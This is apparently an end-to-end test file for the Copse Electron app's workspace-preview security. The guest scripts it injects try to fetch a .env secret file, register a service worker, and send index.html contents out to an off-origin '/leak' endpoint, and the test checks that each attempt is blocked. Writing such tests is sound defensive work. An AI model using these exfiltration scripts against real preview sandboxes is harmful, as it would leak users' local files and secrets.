import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { WebviewTag } from 'electron'
import { $, browser, expect } from '@wdio/globals'
import {
  resetUserData,
  seedE2eViewport,
  seedEmptyProject,
  writeSettings,
} from './helpers/seed-config.ts'
import { E2E_THREE_PANE_VIEWPORT, saveAppScreenshot } from './helpers/screenshot.ts'
import { startBrowserPageFixture } from './helpers/browser-page-fixture.ts'
import { removeE2eTree } from './helpers/remove-tree.ts'

describe('workspace preview security', () => {
  let workspaceRoot = ''
  let egress: Awaited<ReturnType<typeof startBrowserPageFixture>> | null = null

  before(async () => {
    workspaceRoot = mkdtempSync(join(tmpdir(), 'copse-preview-security-'))
    mkdirSync(join(workspaceRoot, 'assets'))
    writeFileSync(
      join(workspaceRoot, 'index.html'),
      '<!doctype html><html><head><title>Workspace preview</title></head>' +
        '<body><h1>Workspace preview</h1><p>Local page</p>' +
        '<script src="/assets/app.js"></script></body></html>',
    )
    writeFileSync(
      join(workspaceRoot, 'assets', 'app.js'),
      'document.documentElement.dataset.previewAsset = "loaded"',
    )
    writeFileSync(join(workspaceRoot, '.env'), 'COPSE_PREVIEW_SECRET=never-serve-this')
    egress = await startBrowserPageFixture(43131)
    resetUserData()
    seedE2eViewport(E2E_THREE_PANE_VIEWPORT)
    seedEmptyProject(workspaceRoot, 'e2e-workspace-preview-security')
    writeSettings({
      openLinksInBuiltInBrowser: false,
      layout: { projectsPaneWidth: 260, filesPaneWidth: 680, fileTreeWidth: 200 },
    })
    await browser.reloadSession()
    await $('.prompt-input').waitForExist({ timeout: 30_000 })
  })

  after(async () => {
    resetUserData()
    if (workspaceRoot) removeE2eTree(workspaceRoot)
    await egress?.close()
  })

  it('keeps a workspace HTML page inside Copse and refuses its secret-file request', async () => {
    const panelButton = await $('.titlebar-btn[aria-label="Toggle right panel"]').getElement()
    if (!(await $('#pane-files').isDisplayed())) await panelButton.click()
    await $('#pane-files').waitForDisplayed({ timeout: 5_000 })

    const row = await $('.tree-row[title="index.html"]').getElement()
    await row.waitForDisplayed({ timeout: 30_000 })
    await row.click({ button: 'right' })
    const open = await $('.context-menu-item').getElement()
    await expect(open).toHaveText('Open in browser')
    await open.click()

    const address = await $('.browser-tab-panel.is-active .browser-url-input').getElement()
    await address.waitForDisplayed({ timeout: 15_000 })
    await browser.waitUntil(
      async () => (await address.getValue()).startsWith('http://localhost:'),
      {
        timeout: 15_000,
        timeoutMsg: 'expected the workspace page in the built-in browser',
      },
    )
    await browser.waitUntil(
      () =>
        browser.execute(() => {
          const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
          return (
            webview?.getURL().startsWith('http://localhost:') &&
            !webview.isLoading() &&
            webview.getTitle() === 'Workspace preview'
          )
        }),
      { timeout: 25_000, timeoutMsg: 'expected the workspace preview to finish loading' },
    )

    const guestResult: unknown = await browser.execute(async () => {
      const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
      if (!webview) throw new Error('Workspace preview webview missing')
      const result: unknown = await webview.executeJavaScript(
        "Promise.all([document.querySelector('h1')?.textContent, document.documentElement.dataset.previewAsset, fetch('/.env').then((response) => response.status), location.search, navigator.serviceWorker?.register('/assets/app.js').then(() => 'registered', (error) => error.name) ?? 'unavailable'])",
      )
      return result
    })
    expect(guestResult).toEqual(['Workspace preview', 'loaded', 404, '', 'SecurityError'])
    expect(await address.getValue()).not.toContain('__copse_preview')
    await saveAppScreenshot('workspace-preview-protected.png', E2E_THREE_PANE_VIEWPORT)
  })

  it('blocks a workspace page from navigating off-origin with file contents', async () => {
    if (!egress) throw new Error('Egress fixture missing')
    const originalAddress = await $('.browser-tab-panel.is-active .browser-url-input').getValue()
    const target = `${egress.origin}/leak?source=`
    await browser.execute(async (targetUrl) => {
      const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
      if (!webview) throw new Error('Workspace preview webview missing')
      const result: unknown = await webview.executeJavaScript(
        `(async () => { const source = await fetch('/index.html').then((response) => response.text()); location.href = ${JSON.stringify(targetUrl)} + encodeURIComponent(source); return source.length; })()`,
      )
      return result
    }, target)
    // A page navigation is asynchronous; allow the attempted request to reach
    // the fixture before checking that the guest navigation gate prevented it.
    await browser.pause(300)
    expect(egress.requests).toEqual([])
    const guestAddress = await browser.execute(() => {
      const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
      return webview?.getURL()
    })
    expect(guestAddress).toBe(originalAddress)
  })
})
